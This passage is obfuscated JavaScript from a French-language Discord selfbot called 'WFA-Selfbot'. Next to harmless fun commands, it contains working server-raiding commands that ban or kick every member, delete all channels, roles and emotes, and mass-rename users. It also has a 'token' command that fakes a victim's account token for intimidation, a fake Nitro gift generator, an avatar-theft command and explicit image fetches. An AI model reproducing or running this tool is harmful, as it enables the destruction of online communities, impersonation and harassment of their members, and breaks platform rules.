        var _0x343bx98 = new Discord.RichEmbed();
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "hentai_anal"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx98 = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx98)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande hentai effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "pussy")) {
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "pussy"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx99 = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx99)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande pussy effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "thigh")) {
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "thigh"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx9a = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx9a)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande thigh effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "anal")) {
        superagent["get"]("https://nekobot.xyz/api/image")["query"]({
            type: "anal"
        })["end"]((_0x343bx16, _0x343bx21) => {
            var _0x343bx9b = new Discord.RichEmbed()["setFooter"]("WFA-Selfbot")["setTimestamp"]()["setImage"](_0x343bx21["body"]["message"])["setColor"](color);
            _0x343bx55["edit"](_0x343bx9b)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande anal effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "fight")) {
        if (!_0x343bx57) {
            return _0x343bx55["edit"](":x: **Aucun utilisateur mentionné**")
        };
        var _0x343bx9c = new Discord.RichEmbed()["setColor"](color)["setFooter"]("WFA-Selfbot")["setTitle"](_0x343bx57["username"] + " __**VS**__ " + client["user"]["username"])["setImage"]("https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif");
        _0x343bx50["edit"](_0x343bx9c)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande fight effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "boom")) {
        if (!_0x343bx57) {
            return _0x343bx55["edit"](":x: **Aucun utilisateur mentionné**")
        };
        var _0x343bx9d = new Discord.RichEmbed()["setColor"](color)["setFooter"]("WFA-Selfbot")["setTitle"](_0x343bx57["username"] + " **Ce Fait Explosé Par **\uD83D\uDCA3\uD83D\uDCA5 " + client["user"]["username"])["setImage"]("https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif");
        _0x343bx50["edit"](_0x343bx9d)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande boom effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "shutdown") {
        _0x343bx55["delete"]()["then"](() => {
            return process["exit"](1)
        });
        console["log"]("Commande shutdown effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "kick")) {
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            _0x343bx50["edit"](":x: **Veuillez executer cette commande sur un serveur!**");
            return
        };
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        _0x343bx57["kick"]()["then"]((_0x343bx66) => {
            _0x343bx50["edit"](":wave: " + _0x343bx66["displayName"] + " has been successfully kicked :point_right: ")
        })["catch"](() => {
            _0x343bx50["edit"](":x: **Access Denied**")
        });
        console["log"]("Commande kick effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "ban")) {
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            _0x343bx50["edit"](":x: **Veuillez executer cette commande sur un serveur!**");
            return
        };
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        _0x343bx57["ban"]()["then"]((_0x343bx66) => {
            _0x343bx50["edit"](":wave: " + _0x343bx66["displayName"] + " has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ")
        })["catch"](() => {
            _0x343bx50["edit"](":x: **Access Denied**")
        });
        console["log"]("Commande ban effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "name all")) {
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            return _0x343bx55["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        const _0x343bx9e = _0x343bx50["content"]["split"](" ")["slice"](2)["join"](" ") || _0x343bx50["author"]["username"];
        if (!_0x343bx50["member"]["hasPermission"]("MANAGE_NICKNAMES")) {
            return _0x343bx50["delete"]()["then"](console["log"]("[", "ERROR" ["red"], "]", "permission insuffisante" ["green"]))
        };
        const _0x343bx9f = _0x343bx50["guild"]["members"];
        _0x343bx55["edit"](`Je renomme tout le monde par ${_0x343bx9e}`);
        _0x343bx9f["forEach"]((_0x343bxa0) => {
            _0x343bxa0["setNickname"](_0x343bx9e)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        });
        console["log"]("Commande name all effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "all ban") {
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            return _0x343bx55["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        if (!_0x343bx50["member"]["hasPermission"]("BAN_MEMBERS")) {
            return _0x343bx50["delete"]()["then"](console["log"]("[", "ERROR" ["red"], "]", "permission insuffisante" ["green"]))
        };
        _0x343bx50["guild"]["members"]["forEach"]((_0x343bxa0) => {
            setInterval(() => {
                if (!_0x343bxa0["bannable"]) {
                    return
                };
                _0x343bxa0["ban"]()["catch"]((_0x343bx5b) => {
                    return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                })
            }, 1000)
        });
        console["log"]("Commande ban all effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "all kick") {
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            return _0x343bx55["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        if (!_0x343bx50["member"]["hasPermission"]("KICK_MEMBERS")) {
            return _0x343bx50["delete"]()["then"](console["log"]("[", "ERROR" ["red"], "]", "permission insuffisante" ["green"]))
        };
        const _0x343bx9f = _0x343bx50["guild"]["members"];
        _0x343bx9f["forEach"]((_0x343bxa0) => {
            if (!_0x343bxa0["kickable"]) {
                return
            };
            _0x343bxa0["kick"]()["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        });
        console["log"]("Commande kick all effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "purge")) {
        _0x343bx50["channel"]["fetchMessages"]()["then"]((_0x343bx50) => {
            return _0x343bx50["forEach"]((_0x343bx65) => {
                if (_0x343bx65["author"]["id"] === client["user"]["id"]) {
                    _0x343bx65["delete"]()["catch"]((_0x343bx5b) => {
                        return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
                    })
                }
            })
        });
        console["log"]("Commande purge effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "rire") {
        let _0x343bxa1 = new Discord.RichEmbed();
        _0x343bxa1["setColor"](color)["setTitle"]("**Commande rire:**")["setTimestamp"]()["setFooter"]("WFA-Selfbot")["setImage"](rire[Math["floor"](Math["random"]() * rire["length"])]);
        _0x343bx50["edit"](_0x343bxa1)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande rire effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "kiss")) {
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        let _0x343bxa2 = new Discord.RichEmbed();
        _0x343bxa2["setColor"](color)["setTitle"](`**${client["user"]["username"]} kiss ${_0x343bx57["username"]}**`)["setTimestamp"]()["setFooter"]("WFA-Selfbot")["setImage"](kiss[Math["floor"](Math["random"]() * kiss["length"])]);
        _0x343bx50["edit"](_0x343bxa2)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande kiss effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "veski")) {
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        let _0x343bxa3 = new Discord.RichEmbed();
        _0x343bxa3["setColor"](color)["setTitle"](`**${_0x343bx57["username"]} s'est enfui!**`)["setTimestamp"]()["setFooter"]("WFA-Selfbot")["setImage"](veski[Math["floor"](Math["random"]() * veski["length"])]);
        _0x343bx50["edit"](_0x343bxa3)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande veski effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "load")) {
        _0x343bx50["delete"]();
        var _0x343bxa4 = ".";
        var _0x343bxa5 = "\u2588";
        _0x343bx50["channel"]["send"]("```[" + _0x343bxa4["repeat"](50) + "]```")["then"]((_0x343bx50) => {
            for (_0x343bx2c = 0; _0x343bx2c <= 50; _0x343bx2c++) {
                _0x343bx50["edit"]("```[" + _0x343bxa5["repeat"](_0x343bx2c) + _0x343bxa4["repeat"](50 - _0x343bx2c) + "]  -  " + (_0x343bx2c * 100) / 50 + "%\n" + "loading..```")
            };
            _0x343bx50["edit"]("`Succesfull load.`")["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            });
            console["log"]("Commande load effectué" ["yellow"])
        })
    };
    if (_0x343bx50["content"] === prefix + "delete all channel") {
        let _0x343bx63 = _0x343bx50["guild"];
        if (!_0x343bx63) {
            _0x343bx50["edit"](":x: **Veuillez executer cette commande dans un serveur!**");
            return
        };
        if (!_0x343bx50["member"]["hasPermission"]("MANAGE_CHANNELS")) {
            return _0x343bx50["delete"]()["then"](console["log"]("[", "ERROR" ["red"], "]", "permission insuffisante" ["green"]))
        };
        var _0x343bxa6 = _0x343bx50["guild"]["channels"];
        _0x343bxa6["forEach"]((_0x343bxa7) => {
            _0x343bxa7["delete"]()["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        });
        console["log"]("Commande delete all channel effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "delete all role") {
        let _0x343bx63 = _0x343bx55["guild"];
        if (!_0x343bx63) {
            _0x343bx50["edit"](":x: **Veuillez executer cette commande sur un serveur!**");
            return
        };
        _0x343bx50["guild"]["roles"]["forEach"]((_0x343bx6e) => {
            _0x343bx6e["delete"]()["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        });
        console["log"]("Commande delete all role effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "punch")) {
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        let _0x343bxa8 = new Discord.RichEmbed();
        _0x343bxa8["setColor"](color)["setTitle"](`**${client["user"]["username"]} punch ${_0x343bx57["username"]}**`)["setTimestamp"]()["setFooter"]("WFA-Selfbot E")["setImage"](punch[Math["floor"](Math["random"]() * punch["length"])]);
        _0x343bx50["edit"](_0x343bxa8)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande punch effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "calin")) {
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        let _0x343bxa9 = new Discord.RichEmbed();
        _0x343bxa9["setColor"](color)["setTitle"](`**${client["user"]["username"]} fait un calin a ${_0x343bx57["username"]}**`)["setTimestamp"]()["setFooter"]("WFA-Selfbot")["setImage"](hugh[Math["floor"](Math["random"]() * hugh["length"])]);
        _0x343bx50["edit"](_0x343bxa9)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande calin effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "set serveur name")) {
        let _0x343bxaa = _0x343bx56["splice"](1)["join"](" ") || "WFA selfbot";
        _0x343bx50["edit"](`Changement du nom du serveur pour: ` + _0x343bxaa);
        _0x343bx50["guild"]["setName"](_0x343bxaa);
        console["log"]("Commande set serveur name effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](`${prefix}token`)) {
        if (!_0x343bx57) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur!**");
            return
        };
        let token = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"];
        let _0x343bxab = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
        var _0x343bx79 = _0x343bx57["id"];
        var _0x343bxac = utf8["encode"](_0x343bx79);
        var _0x343bxad = base64["encode"](_0x343bxac);
        let _0x343bxae = new Discord.RichEmbed()["setColor"](`${color}`)["setFooter"]("WFA-Selfbot")["setTitle"](`Token match ${_0x343bx57["username"]}`)["setDescription"](`${_0x343bxad}.${token[Math["floor"](Math["random"]()* token["length"])]}.${_0x343bxab[Math["floor"](Math["random"]()* _0x343bxab["length"])]}`);
        setTimeout(() => {
            _0x343bx50["edit"]("\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 0%")
        }, 1000);
        setTimeout(() => {
            _0x343bx50["edit"]("\u2593\u2593\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 20%")
        }, 1500);
        setTimeout(() => {
            _0x343bx50["edit"]("\u2593\u2593\u2593\u2593\u2591\u2591\u2591\u2591\u2591\u2591 40%")
        }, 2000);
        setTimeout(() => {
            _0x343bx50["edit"]("\u2593\u2593\u2593\u2593\u2593\u2593\u2591\u2591\u2591\u2591 60%")
        }, 2500);
        setTimeout(() => {
            _0x343bx50["edit"]("\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2591\u2591 80%")
        }, 3000);
        setTimeout(() => {
            _0x343bx50["edit"]("\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100%")
        }, 3500);
        setTimeout(() => {
            _0x343bx50["edit"](_0x343bxae)["catch"]((_0x343bx5b) => {
                return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
            })
        }, 4000);
        console["log"]("Commande token effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](`${prefix}encode`)) {
        var _0x343bxaf = _0x343bx56["join"](" ") || "WFA selfbot";
        var _0x343bxac = utf8["encode"](_0x343bxaf);
        var _0x343bxad = base64["encode"](_0x343bxac);
        let _0x343bxae = new Discord.RichEmbed()["setColor"](`${color}`)["setTitle"]("Texte -> Base64 :")["setDescription"](_0x343bxad);
        _0x343bx50["edit"](_0x343bxae)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande encode effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](`${prefix}lovecalc`)) {
        let _0x343bxb0 = ["5%", "10%", "15%", "20%", "25%", "30%", "35%", "40%", "45%", "50%", "55", "60%", "65%", "70%", "75%", "80%", "85%", "90%", "95%", "100%"];
        let _0x343bxb1 = Math["floor"](Math["random"]() * _0x343bxb0["length"]);
        let _0x343bxb2 = _0x343bx56["slice"](0)["join"](" ") || "WFA selfbot";
        let _0x343bx86 = new Discord.RichEmbed()["setAuthor"](_0x343bx50["author"]["tag"])["setColor"]("ORANGE")["setFooter"]("WFA-Selfbot")["setThumbnail"](`${_0x343bx50["author"]["avatarURL"]}`)["addField"]("calcul de relation plausible \u2764", _0x343bxb2)["addField"]("relation estimée à \u2764", _0x343bxb0[_0x343bxb1]);
        _0x343bx50["edit"](_0x343bx86)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande lovecalc effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "spotify")) {
        const _0x343bx9e = _0x343bx50["content"]["split"](" ")["slice"](1)["join"](" ") || "WFA Selfbot";
        let _0x343bx43 = rpcGenerator["createSpotifyRpc"](client)["setAssetsLargeImage"]("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")["setAssetsSmallImage"]("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")["setDetails"](_0x343bx9e)["setState"]("WFA-Selfbot")["setStartTimestamp"](Date["now"]())["setEndTimestamp"](Date["now"]() + 86400000);
        client["user"]["setPresence"](_0x343bx43["toDiscord"]())["then"](_0x343bx50["edit"](`:white_check_mark: **Tu écoutes ${_0x343bx9e} sur spotify**`))["catch"](console["error"]);
        console["log"]("Commande spotify effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](`${prefix}reset`)) {
        clearInterval();
        client["user"]["setActivity"](null, {});
        _0x343bx50["edit"](`:information_source:  Votre statut a été réinitialisé ! :information_source:`)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande reset effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === `${prefix}nitro`) {
        const _0x343bxb3 = new Discord.RichEmbed()["setColor"](color)["setThumbnail"]("https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif")["addField"]("Gift :", "|| https:/" + "/discord.gift/" + nitrocode(16, "0aA") + " ||");
        _0x343bx50["edit"](_0x343bxb3)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande nitro generator effectué" ["yellow"])
    };
    if (_0x343bx55["content"]["startsWith"](prefix + "gen token")) {
        _0x343bx55["delete"]();
        console["log"](`Nouveau token generé` ["green"])
    };
    if (_0x343bx55["content"]["startsWith"](prefix + "reverse")) {
        let _0x343bxb4 = _0x343bx56["splice"](1)["join"](" ");
        if (!_0x343bxb4) {
            _0x343bx50["edit"](":x: **Pas de test definit**")
        };

        function _0x343bxb5(_0x343bxb6) {
            return _0x343bxb6["split"]("")["reverse"]()["join"]("")
        }
        let _0x343bxb7 = _0x343bxb5(_0x343bxb4);
        if (_0x343bx56[0] === _0x343bxb7) {
            _0x343bxb7 = `${_0x343bx56["splice"](1)["join"](" ")}`
        };
        _0x343bx55["edit"](`${_0x343bxb7}`)["catch"](console["error"]);
        console["log"]("Commande reverse effectué" ["yellow"])
    };
    if (_0x343bx55["content"]["startsWith"](prefix + "discord")) {
        let _0x343bxb8 = new Discord.RichEmbed()["setColor"](color)["setDescription"](`Discord Version : **${Discord["version"]}**`)["setFooter"]("WFA-Selfbot");
        _0x343bx55["edit"](_0x343bxb8)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler" ["green"])
        });
        console["log"]("Commande discord effectué" ["yellow"])
    };
    if (_0x343bx50["content"] === prefix + "restart") {
        _0x343bx50["edit"]("**redémarrage** du self bot...")["then"](client["destroy"]())["then"](() => {
            return client["login"](token)
        });
        console["log"]("Commande restart effectué" ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "role info" || prefix + "ri")) {
        let _0x343bx63 = _0x343bx50["guild"];
        let _0x343bxb9 = _0x343bx50["mentions"]["roles"]["first"]();
        if (!_0x343bx63) {
            return _0x343bx55["edit"](":x: **Commande uniquement utilisable sur un serveur**")
        };
        if (!_0x343bxb9) {
            return _0x343bx50["delete"]()["then"](console["log"]("[", "ERROR" ["red"], "]", "un nom de rôle est nécessaire" ["green"]))
        };
        const _0x343bx92 = {
            false: "Non",
            true: "oui"
        };
        let _0x343bxba = new Discord.RichEmbed()["setColor"](color)["setDescription"](`<@&${_0x343bxb9["id"]}>`)["addField"]("id du role:", _0x343bxb9["id"])["addField"]("couleur:", _0x343bxb9["hexColor"])["setFooter"]("WFA-Selfbot")["addField"]("nombre de membres ayant ce role:", _0x343bxb9["members"]["size"])["addField"]("position:", _0x343bxb9["position"])["addField"]("mentionnable:", _0x343bx92[_0x343bxb9["mentionable"]]);
        if (!_0x343bx50["member"]["hasPermission"]("EMBED_LINKS")) {
            return _0x343bx50["edit"](`:x: **permission insuffisante (embed_links)**\n<@&${_0x343bxb9["id"]}>\n\nid du role: ${_0x343bxb9["id"]}\ncouleur du role: ${_0x343bxb9["hexColor"]}\nmembres ayant ce role: ${_0x343bxb9["members"]["size"]}\nposition: ${_0x343bxb9["position"]}\nmentionnable: ${_0x343bx92[_0x343bxb9["mentionable"]]}`)
        };
        console["log"]("Commande role info effectué" ["yellow"]);
        _0x343bx50["edit"](_0x343bxba)["catch"]((_0x343bx5b) => {
            return console["log"]("[", "ERROR" ["red"], "]", "une erreur est survenue que je ne peux régler")
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "add emote")) {
        if (_0x343bx50["channel"]["type"] === "dm") {
            _0x343bx50["edit"](":x: **Commande pas executable en mp**");
            return
        };
        let _0x343bxaa = _0x343bx56["splice"](2)["join"](" ");
        let _0x343bxbb = Discord["Util"]["parseEmoji"](_0x343bxaa);
        if (!_0x343bx56) {
            _0x343bx50["edit"](":x: **Veuillez choisir une emote.**");
            return
        };
        if (!_0x343bxbb) {
            _0x343bx50["edit"](`:x: **Emote invalide essayez ceci** ${prefix}add emote (emote) <name>`);
            return
        };
        if (!_0x343bx50["member"]["hasPermission"]("MANAGE_EMOJIS")) {
            _0x343bx50["edit"](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
            return
        };
        if (_0x343bxbb["id"]) {
            const _0x343bxbc = `https://cdn.discordapp.com/emojis/${_0x343bxbb["id"]}.${_0x343bxbb["animated"]?"gif":"png"}`;
            let _0x343bxbd = _0x343bx50["content"]["split"](" ")["splice"](3) || _0x343bxbb["name"];
            _0x343bx50["guild"]["createEmoji"](`${_0x343bxbc}`, `${_0x343bxbd}`);
            _0x343bx50["edit"](":white_check_mark: **Emote ajoutée au serveur.**");
            console["log"]("Commande add emote executé." ["yellow"])
        } else {
            _0x343bx50["edit"](":x: **Veuillez choisir une emote valide!**")
        }
    };
    if (_0x343bx50["content"] === prefix + "emote") {
        if (_0x343bx50["channel"]["type"] === "dm") {
            _0x343bx50["edit"](":x: **Commande pas executable en mp**");
            return
        };
        let _0x343bxbe = "";
        let _0x343bxbf = "";
        let _0x343bxc0 = 0;
        let _0x343bxc1 = 0;
        let _0x343bxc2 = 0;

        function _0x343bxc3(_0x343bx79) {
            return client["emojis"]["get"](_0x343bx79).toString()
        }
        _0x343bx50["guild"]["emojis"]["forEach"]((_0x343bxc4) => {
            _0x343bxc2++;
            if (_0x343bxc4["animated"]) {
                _0x343bxc1++;
                _0x343bxbf += _0x343bxc3(_0x343bxc4["id"])
            } else {
                _0x343bxc0++;
                _0x343bxbe += _0x343bxc3(_0x343bxc4["id"])
            }
        });
        let _0x343bx86 = new Discord.RichEmbed()["setTitle"](`Emojis dans: **${_0x343bx50["guild"]["name"]}**`)["setFooter"]("WFA-Selfbot")["setColor"](color)["addField"](`Emojis animés: [${_0x343bxc1}]`, _0x343bxbf || `None`)["addField"](`Emojis [${_0x343bxc0}]`, _0x343bxbe || `None`)["addField"]("Total d'emojis", _0x343bxc2 || `None`);
        _0x343bx50["edit"](_0x343bx86);
        console["log"]("Commande emote executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "remove emote")) {
        if (_0x343bx50["channel"]["type"] === "dm") {
            _0x343bx50["edit"](":x: **Commande pas executable en mp**");
            return
        };
        if (!_0x343bx50["member"]["hasPermission"](`MANAGE_EMOJIS`)) {
            return _0x343bx50["edit"](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**')
        };
        const _0x343bxc4 = _0x343bx56["splice"](2)["join"](" ");
        if (!_0x343bxc4) {
            return _0x343bx50["edit"](`:x: **Veuillez choisir une emote.**`)
        };
        let _0x343bxbb = Discord["Util"]["parseEmoji"](_0x343bxc4);
        if (!_0x343bx50["guild"]["emojis"]["forEach"]((_0x343bxc5) => {
                if (!_0x343bxc5["id"] === _0x343bxbb["id"]) {
                    return _0x343bx50["channel"]["send"](`:x: **Cette emote n'est pas sur le serveur**.`)
                }
            })) {
            return _0x343bx50["edit"](":white_check_mark: **Emote correctement supprimée du serveur.**")
        };
        if (_0x343bxbb["id"]) {
            const _0x343bxbc = `https://cdn.discordapp.com/emojis/${_0x343bxbb["id"]}.${_0x343bxbb["animated"]?"gif":"png"}`;
            _0x343bx50["guild"]["emojis"]["get"](_0x343bxbb["id"])["delete"]()
        } else {
            let _0x343bxc6 = parse(_0x343bxc4, {
                assetType: "png"
            });
            if (!_0x343bxc6[0]) {
                return _0x343bx50["edit"](`:x: **Veuillez choisir une emote valide**!`)
            };
            _0x343bx50["edit"](`:x: **Vous ne pouvez pas supprimer les emotes par defaut**!`)
        };
        console["log"]("Commande remove emote executé." ["yellow"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "steal banniere")) {
        _0x343bx50["delete"]();
        let _0x343bxc7 = _0x343bx50["guild"]["bannerURL"];
        console["log"](`Voici la bannière de ${_0x343bx50["guild"]["name"]}: ${_0x343bxc7}` ["green"])
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "steal emote")) {
        if (_0x343bx50["channel"]["type"] === "dm") {
            _0x343bx50["edit"](":x: **Commande pas executable en mp**");
            return
        };
        let _0x343bxaa = _0x343bx56["splice"](2)["join"](" ");
        let _0x343bxc8 = client["guilds"]["get"](_0x343bxaa);
        if (!_0x343bxc8) {
            _0x343bx50["edit"](`:x: **Aucun serveur trouvable avec l'id** "${_0x343bxaa}"`);
            return
        };
        if (!_0x343bx50["member"]["hasPermission"](`MANAGE_EMOJIS`)) {
            return _0x343bx50["edit"](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**')
        };
        if (_0x343bxc8["emojis"]["size"] < 1) {
            _0x343bx50["edit"](":x: **Le serveur ne contient aucun emote.**")
        };
        let _0x343bx2c = "1";
        _0x343bxc8["emojis"]["forEach"]((_0x343bxc5) => {
            setTimeout(() => {
                let _0x343bxbd = _0x343bxc5["name"];
                const _0x343bxbc = `https://cdn.discordapp.com/emojis/${_0x343bxc5["id"]}.${_0x343bxc5["animated"]?"gif":"png"}`;
                _0x343bx50["guild"]["createEmoji"](`${_0x343bxbc}`, `${_0x343bxbd}`)["catch"]((_0x343bx5b) => {
                    return _0x343bx2c + "1"
                })
            }, 1000)
        });
        console["log"]("Commande steal emote executé." ["yellow"]);
        _0x343bx50["edit"](`:white_check_mark: **J'ai volé les emotes du serveur** "${_0x343bxc8["name"]}"`)
    };
    if (_0x343bx50["content"] === prefix + "delete all emote") {
        if (_0x343bx50["channel"]["type"] === "dm") {
            _0x343bx50["edit"](":x: **Commande pas executable en mp**");
            return
        };
        if (_0x343bx50["guild"]["emojis"]["size"] < 1) {
            _0x343bx50["edit"](":x: **Il n' y a aucun emote a supprimer.**");
            return
        };
        _0x343bx50["guild"]["emojis"]["forEach"]((_0x343bxc5) => {
            _0x343bx50["guild"]["emojis"]["get"](_0x343bxc5["id"])["delete"]()
        })
    };
    if (_0x343bx50["content"]["startsWith"](prefix + "grab pp")) {
        let _0x343bxc9 = _0x343bx50["mentions"]["users"]["first"]();
        let _0x343bxca = _0x343bxc9["avatarURL"];
        if (!_0x343bxc9) {
            _0x343bx50["edit"](":x: **Veuillez mentionner un utilisateur valide!**");
            return
        };
        if (!_0x343bxca) {
            _0x343bx50["edi"](":x: **Cet utilisateur n'a pas d'avatar!**");
            return
        };
        client["user"]["setAvatar"](_0x343bxca);
        console["log"]("Commande grab pp executé." ["yellow"]);
        _0x343bx50["edit"](`:white_check_mark: **J'ai correctement volé la photo de profile de ** "${_0x343bxc9["username"]}"`)
    };
    try {
